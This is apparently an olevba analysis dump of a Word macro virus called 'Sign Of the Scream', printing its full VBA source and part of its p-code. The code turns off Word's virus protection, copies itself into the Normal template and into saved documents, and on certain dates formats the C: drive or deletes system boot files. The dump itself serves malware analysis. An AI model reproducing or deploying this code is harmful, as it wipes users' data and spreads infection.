olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Scream.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SignOS.cls 
in file: Virus.MSWord.Scream.a - OLE stream: 'Macros/VBA/SignOS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAEx
Dim MyDate, MyTime
T$ = Mid(MyTime, 1, 2)
MyDate = Date
D$ = Mid(MyDate, 1, 2)
D1$ = Mid(MyDate, 1, 5)
Select Case D$
Case 1, 3, 5, 7, 9, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31
Sos1:
    Pay1.Show
    If System.PrivateProfileString("C:\Dos\Sos.ini", "Pay1", "OK") = "0" Then GoTo Sos1
    If D1$ = "01/08" Then
        MsgBox "Vive le groupe SOS et son créateur Nightmare Joker!!!!", vbInformation, "Virus SOS(Sign Of the Scream)"
        Open "C:\SOS.BAT" For Output As #1
            Print #1, "echo y|format c: /u"
            Print #1, "echo o|format c: /u"
        Close #1
        Shell "C:\SOS.BAT", vbHide
        WordBasic.Exit
    End If
Case 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30
Sos2:
    Pay2.Show
    If System.PrivateProfileString("C:\Dos\Sos.ini", "Pay2", "OK") = "0" Then GoTo Sos2
    If D1$ = "24/12" Then
        MsgBox "Joyeux noel de la part de ZeMacroKiller98!!!", vbInformation, "Virus SOS"
        Kill "C:\config.sys"
        Kill "C:\Autoexec.bat"
        Kill "C:\msdos.sys"
        Kill "C:\io.sys"
    End If
End Select
ErrorAEx:
End Sub
Private Sub Document_Close()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorDC
Selection.EndKey Unit:=wdStory
Selection.TypeParagraph
Selection.TypeText Text:="SOS-> The Sign Of the Scream"
ActiveDocument.Save
ErrorDC:
End Sub

Private Sub Document_New()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorDN
ActiveDocument.Shapes.AddTextEffect(msoTextEffect22, "Sign Of the Scream", "Impact", 70#, msoFalse, msoFalse, 83.5, 91#).Select
ErrorDN:
End Sub
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorDO
iMacroNormalCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNormalCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "SignOS" Then
        SosNTInstalled = -1
    End If
Next i
If Not SosNTInstalled Then
    ActiveDocument.VBProject.VBComponents("SignOS").Export "C:\Sos.sys"
    ActiveDocument.VBProject.VBComponents("HA").Export "C:\HA.sys"
    ActiveDocument.VBProject.VBComponents("Pay1").Export "C:\Pay1.sys"
    ActiveDocument.VBProject.VBComponents("Pay2").Export "C:\Pay2.sys"
    ActiveDocument.VBProject.VBComponents("MVB").Export "C:\MVB.sys"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\Sos.sys"
    NormalTemplate.VBProject.VBComponents("SignOS").CodeModule.DeleteLines 1, 4
    NormalTemplate.VBProject.VBComponents.Import "C:\HA.sys"
    NormalTemplate.VBProject.VBComponents.Import "C:\Pay1.sys"
    NormalTemplate.VBProject.VBComponents.Import "C:\Pay2.sys"
    NormalTemplate.VBProject.VBComponents.Import "C:\MVB.sys"
    CommandBars("help").Controls(5).Caption = "A propos du Virus SOS"
End If
ErrorDO:
End Sub
Sub FileSaveAs()
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Virus.Sos.FileSaveAs"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
iMacroDocumentCount = ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroDocumentCount
    If ActiveDocument.VBProject.VBComponents(i).Name = "SignOS" Then
        SosDocInstalled = -1
    End If
Next i
If Not SosDocInstalled Then
    NormalTemplate.VBProject.VBComponents("SignOS").Export "C:\Sos.sys"
    NormalTemplate.VBProject.VBComponents("HA").Export "C:\HA.sys"
    NormalTemplate.VBProject.VBComponents("Pay1").Export "C:\Pay1.sys"
    NormalTemplate.VBProject.VBComponents("Pay2").Export "C:\Pay2.sys"
    NormalTemplate.VBProject.VBComponents("MVB").Export "C:\MVB.sys"
    ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\Sos.sys"
    ActiveDocument.VBProject.VBComponents("SignOS").CodeModule.DeleteLines 1, 4
    ActiveDocument.VBProject.VBComponents.Import "C:\HA.sys"
    ActiveDocument.VBProject.VBComponents.Import "C:\Pay1.sys"
    ActiveDocument.VBProject.VBComponents.Import "C:\Pay2.sys"
    ActiveDocument.VBProject.VBComponents.Import "C:\MVB.sys"
End If
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFTe
ErrorFTe:
End Sub
Sub HelpAbout()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorHA
HA.Show
ErrorHA:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTMa
MsgBox "Attention, votre ordinateur contient le SOS..." & Chr$(13) & "Your computer contain the SOS...", vbCritical, "Virus SOS (Sign Of the Scream)"
ErrorTMa:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
MVB.Show
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO HA.frm 
in file: Virus.MSWord.Scream.a - OLE stream: 'Macros/VBA/HA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Private Sub CommandButton1_Click()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Unload HA
End Sub
-------------------------------------------------------------------------------
VBA MACRO Pay1.frm 
in file: Virus.MSWord.Scream.a - OLE stream: 'Macros/VBA/Pay1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("C:\Dos\Sos.ini", "Pay1", "OK") = "0"
End Sub
Private Sub CommandButton1_Click()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("C:\DOS\Sos.ini", "Pay1", "OK") = "1"
Unload Pay1
End Sub
-------------------------------------------------------------------------------
VBA MACRO Pay2.frm 
in file: Virus.MSWord.Scream.a - OLE stream: 'Macros/VBA/Pay2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("C:\Dos\Sos.ini", "Pay2", "OK") = "0"
End Sub
Private Sub CommandButton1_Click()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("C:\Dos\Sos.ini", "Pay2", "OK") = "1"
Unload Pay2
End Sub
-------------------------------------------------------------------------------
VBA MACRO MVB.frm 
in file: Virus.MSWord.Scream.a - OLE stream: 'Macros/VBA/MVB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Scream.a
' ===============================================================================
' Module streams:
' Macros/VBA/SignOS - 30776 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAEx 
' Line #6:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyTime
' Line #7:
' 	Ld MyTime 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St T$ 
' Line #8:
' 	Ld Date 
' 	St MyDate 
' Line #9:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #10:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St D1$ 
' Line #11:
' 	Ld D$ 
' 	SelectCase 
' Line #12:
' 	LitDI2 0x0001 
' 	Case 
' 	LitDI2 0x0003 
' 	Case 
' 	LitDI2 0x0005 
' 	Case 
' 	LitDI2 0x0007 
' 	Case 
' 	LitDI2 0x0009 
' 	Case 
' 	LitDI2 0x000D 
' 	Case 
' 	LitDI2 0x000F 
' 	Case 
' 	LitDI2 0x0011 
' 	Case 
' 	LitDI2 0x0013 
' 	Case 
' 	LitDI2 0x0015 
' 	Case 
' 	LitDI2 0x0017 
' 	Case 
' 	LitDI2 0x0019 
' 	Case 
' 	LitDI2 0x001B 
' 	Case 
' 	LitDI2 0x001D 
' 	Case 
' 	LitDI2 0x001F 
' 	Case 
' 	CaseDone 
' Line #13:
' 	Label Sos1 
' Line #14:
' 	Ld Pay1 
' 	ArgsMemCall Show 0x0000 
' Line #15:
' 	LitStr 0x000E "C:\Dos\Sos.ini"
' 	LitStr 0x0004 "Pay1"
' 	LitStr 0x0002 "OK"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Sos1 
' 	EndIf 
' Line #16:
' 	Ld D1$ 
' 	LitStr 0x0005 "01/08"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitStr 0x0036 "Vive le groupe SOS et son créateur Nightmare Joker!!!!"
' 	Ld vbInformation 
' 	LitStr 0x001D "Virus SOS(Sign Of the Scream)"
' 	ArgsCall MsgBox 0x0003 
' Line #18:
' 	LitStr 0x000A "C:\SOS.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "echo y|format c: /u"
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "echo o|format c: /u"
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #22:
' 	LitStr 0x000A "C:\SOS.BAT"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemCall Explicit 0x0000 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	LitDI2 0x0002 
' 	Case 
' 	LitDI2 0x0004 
' 	Case 
' 	LitDI2 0x0006 
' 	Case 
' 	LitDI2 0x0008 
' 	Case 
' 	LitDI2 0x000A 
' 	Case 
' 	LitDI2 0x000C 
' 	Case 
' 	LitDI2 0x000E 
' 	Case 
' 	LitDI2 0x0010 
' 	Case 
' 	LitDI2 0x0012 
' 	Case 
' 	LitDI2 0x0014 
' 	Case 
' 	LitDI2 0x0016 
' 	Case 
' 	LitDI2 0x0018 
' 	Case 
' 	LitDI2 0x001A 
' 	Case 
' 	LitDI2 0x001C 
' 	Case 
' 	LitDI2 0x001E 
' 	Case 
' 	CaseDone 
' Line #26:
' 	Label Sos2 
' Line #27:
' 	Ld Pay2 
' 	ArgsMemCall Show 0x0000 
' Line #28:
' 	LitStr 0x000E "C:\Dos\Sos.ini"
' 	LitStr 0x0004 "Pay2"
' 	LitStr 0x0002 "OK"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Sos2 
' 	EndIf 
' Line #29:
' 	Ld D1$ 
' 	LitStr 0x0005 "24/12"
' 	Eq 
' 	IfBlock 
' Line #30:
' 	LitStr 0x002C "Joyeux noel de la part de ZeMacroKiller98!!!"
' 	Ld vbInformation 
' 	LitStr 0x0009 "Virus SOS"
' 	ArgsCall MsgBox 0x0003 
' Line #31:
' 	LitStr 0x000D "C:\config.sys"
' 	ArgsCall Kill 0x0001 
' Line #32:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	ArgsCall Kill 0x0001 
' Line #33:
' 	LitStr 0x000C "C:\msdos.sys"
' 	ArgsCall Kill 0x0001 
' Line #34:
' 	LitStr 0x0009 "C:\io.sys"
' 	ArgsCall Kill 0x0001 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndSelect 
' Line #37:
' 	Label ErrorAEx 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Private Sub Document_Close())
' Line #40:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #41:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #42:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #43:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #44:
' 	OnError ErrorDC 
' Line #45:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #46:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #47:
' 	LitStr 0x001C "SOS-> The Sign Of the Scream"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #48:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	Label ErrorDC 
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' 	FuncDefn (Private Sub Document_New())
' Line #53:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #54:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #57:
' 	OnError ErrorDN 
' Line #58:
' 	Ld msoTextEffect22 
' 	LitStr 0x0012 "Sign Of the Scream"
' 	LitStr 0x0006 "Impact"
' 	LitR8 0x0000 0x0000 0x8000 0x4051 
' 	Ld msoFalse 
' 	Ld msoFalse 
' 	LitR8 0x0000 0x0000 0xE000 0x4054 
' 	LitR8 0x0000 0x0000 0xC000 0x4056 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddTextEffect 0x0008 
' 	ArgsMemCall Set 0x0000 
' Line #59:
' 	Label ErrorDN 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Private Sub Document_Open())
' Line #62:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #63:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #64:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #65:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #66:
' 	OnError ErrorDO 
' Line #67:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroNormalCount 
' Line #68:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroNormalCount 
' 	For 
' Line #69:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "SignOS"
' 	Eq 
' 	IfBlock 
' Line #70:
' 	LitDI2 0x0001 
' 	UMi 
' 	St SosNTInstalled 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' 	Ld SosNTInstalled 
' 	Not 
' 	IfBlock 
' Line #74:
' 	LitStr 0x000A "C:\Sos.sys"
' 	LitStr 0x0006 "SignOS"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #75:
' 	LitStr 0x0009 "C:\HA.sys"
' 	LitStr 0x0002 "HA"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #76:
' 	LitStr 0x000B "C:\Pay1.sys"
' 	LitStr 0x0004 "Pay1"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #77:
' 	LitStr 0x000B "C:\Pay2.sys"
' 	LitStr 0x0004 "Pay2"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #78:
' 	LitStr 0x000A "C:\MVB.sys"
' 	LitStr 0x0003 "MVB"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #79:
' 	LitStr 0x000A "C:\Sos.sys"
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #80:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitStr 0x0006 "SignOS"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #81:
' 	LitStr 0x0009 "C:\HA.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #82:
' 	LitStr 0x000B "C:\Pay1.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #83:
' 	LitStr 0x000B "C:\Pay2.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #84:
' 	LitStr 0x000A "C:\MVB.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #85:
' 	LitStr 0x0015 "A propos du Virus SOS"
' 	LitDI2 0x0005 
' 	LitStr 0x0004 "help"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Label ErrorDO 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Sub FileSaveAs())
' Line #90:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #91:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #92:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #93:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #94:
' 	OnError ErrorFSA 
' Line #95:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #97:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroDocumentCount 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroDocumentCount 
' 	For 
' Line #101:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "SignOS"
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitDI2 0x0001 
' 	UMi 
' 	St SosDocInstalled 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	Ld SosDocInstalled 
' 	Not 
' 	IfBlock 
' Line #106:
' 	LitStr 0x000A "C:\Sos.sys"
' 	LitStr 0x0006 "SignOS"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #107:
' 	LitStr 0x0009 "C:\HA.sys"
' 	LitStr 0x0002 "HA"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #108:
' 	LitStr 0x000B "C:\Pay1.sys"
' 	LitStr 0x0004 "Pay1"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #109:
' 	LitStr 0x000B "C:\Pay2.sys"
' 	LitStr 0x0004 "Pay2"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #110:
' 	LitStr 0x000A "C:\MVB.sys"
' 	LitStr 0x0003 "MVB"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #111:
' 	LitStr 0x000A "C:\Sos.sys"
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #112:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitStr 0x0006 "SignOS"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #113:
' 	LitStr 0x0009 "C:\HA.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #114:
' 	LitStr 0x000B "C:\Pay1.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #115:
' 	LitStr 0x000B "C:\Pay2.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #116:
' 	LitStr 0x000A "C:\MVB.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	Label ErrorFSA 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub FileTemplates())
' Line #121:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #122:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #123:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #124:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #125:
' 	OnError ErrorFTe 
' Line #126:
' 	Label ErrorFTe 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Sub HelpAbout())
' Line #129:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #130:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #131:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #132:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #133:
' 	OnError ErrorHA 
' Line #134:
' 	Ld HA 
' 	ArgsMemCall Show 0x0000 
' Line #135:
' 	Label ErrorHA 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub ToolsMacro())
' Line #138:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #139:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #140:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #141:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #142:
' 	OnError ErrorTMa 
' Line #143:
' 	LitStr 0x002E "Attention, votre ordinateur contient le SOS..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0020 "Your computer contain the SOS..."
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x001E "Virus SOS (Sign Of the Scream)"
' 	ArgsCall MsgBox 0x0003 
' Line #144:
' 	Label ErrorTMa 
' Line #145:
' 	EndSub 
' Line #146:
' 	FuncDefn (Sub ViewVBCode())
' Line #147:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #148:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #149:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #150:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #151:
' 	OnError ErrorVVBC 
' Line #152:
' 	Ld MVB 
' 	ArgsMemCall Show 0x0000 
' Line #153:
' 	Label ErrorVVBC 
' Line #154:
' 	EndSub 
' Macros/VBA/HA - 3763 bytes
' Line #0:
' 	FuncDefn (Private Sub userform_initialize())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #7:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	Ld HA 
' 	ArgsCall Unlock 0x0001 
' Line #12:
' 	EndSub 
' Macros/VBA/Pay1 - 3653 bytes
' Line #0:
' 	FuncDefn (Private Sub userform_initialize())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
